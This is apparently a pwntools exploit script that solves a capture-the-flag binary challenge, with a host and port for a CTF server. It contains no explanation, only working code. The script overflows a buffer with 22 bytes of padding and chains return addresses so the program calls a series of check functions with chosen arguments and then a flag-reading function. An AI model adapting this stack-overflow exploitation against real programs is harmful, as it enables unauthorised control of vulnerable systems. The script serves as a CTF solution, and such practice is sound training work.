#!/usr/bin/python3

from pwn import *

exe = ELF('rop_black_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x08049367

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.battlectf.online', 1004)
else:
        p = process(exe.path)

GDB()
pop_esi_edi_ebp_ret = 0x080493e9
pop_ebp = 0x080492e6
rw_sec = 0x0804ca00
payload = b""
payload = b"a" * 22 + flat(
        exe.sym['check_capcha']+1, 0,exe.sym['vuln'],  0x62023, 0xbf1212
        )
sl(payload)



payload = b"a" * 22 + flat(
        exe.sym['check_african'], exe.sym['vuln'], 
        )
sl( payload)

payload = b"a" * 22 + flat(
        exe.sym['check_flag'], exe.sym['vuln'], 0x0804a033, 
        )
sl(payload)

payload = b"a" * 22 + flat(
        exe.sym['check_invitecode'], exe.sym['read_flag'], 0xbae
        )
sl(payload)
p.interactive()
